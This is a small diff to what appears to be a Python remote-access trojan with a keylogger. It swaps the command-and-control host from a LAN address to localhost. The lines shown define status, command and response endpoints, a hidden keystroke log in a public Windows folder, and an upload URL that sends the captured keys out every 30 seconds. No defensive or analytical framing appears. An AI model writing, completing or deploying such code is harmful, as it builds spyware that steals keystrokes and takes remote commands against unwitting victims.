@@ -40,14 +40,14 @@ if not success:
 hostname = buffer.value
 
 
-BASE_URL = "http://192.168.35.1/"
+BASE_URL = "http://127.0.0.1:8000/"
 STATUS_ENDPOINT = f"{BASE_URL}/status"
 COMMANDER_ENDPOINT = f"{BASE_URL}/Comander"
 RESPONSES_ENDPOINT = f"{BASE_URL}/Responses"
 
 
 KEYLOG_PATH = r"C:\Users\Public\Downloads\keyloge.txt"
-KEYLOG_UPLOAD_URL = "http://192.168.35.1/uploads"
+KEYLOG_UPLOAD_URL = "http://127.0.0.1:8000/uploads"
 KEYLOG_INTERVAL_SECS = 30 
 
 try:
@@ -245,5 +245,6 @@ if __name__ == "__main__":
     t.start()
 
     main_loop()
+
 
 
